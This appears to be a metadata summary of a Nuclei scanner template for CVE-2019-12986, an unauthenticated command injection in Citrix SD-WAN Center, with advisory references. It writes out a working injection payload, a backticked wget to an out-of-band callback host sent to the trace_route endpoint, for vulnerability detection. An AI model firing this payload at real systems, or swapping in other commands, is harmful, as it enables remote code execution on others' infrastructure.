---
cve_id: CVE-2019-12986
template_path: nuclei-templates/http/cves/2019/CVE-2019-12986.yaml
affected_product: Citrix SD-WAN Center
severity: critical
authentication: none
external_callback: true
affected_versions: unknown
preconditions: []
poc_classification: rce
---

## Vulnerability
Citrix SD-WAN Center contains a critical unauthenticated remote command injection (CWE-78, CVSS 9.8) in DiagnosticsController.trace_route. The function fails to sanitize the ipAddress HTTP parameter before embedding it into a shell command via backticks. An attacker who can reach /Collector/diagnostics/trace_route (routed through the Collector controller) can achieve full remote code execution, arbitrary command execution, data exfiltration, and complete infrastructure compromise.

## PoC / Detection
Classification: rce

The template first issues a benign GET /login and asserts the response body contains `<title>Citrix SD-WAN</title>` to fingerprint a valid target. It then sends a single POST /Collector/diagnostics/trace_route with Content-Type application/x-www-form-urlencoded and payload `ipAddress=`/bin/wget http://{{interactsh-url}}``. Successful injection is confirmed out-of-band when the interactsh server receives an HTTP callback (matcher on interactsh_protocol == "http").

## References
- https://www.tenable.com/security/research/tra-2019-31
- https://support.citrix.com/article/CTX251987
- https://nvd.nist.gov/vuln/detail/CVE-2019-12986
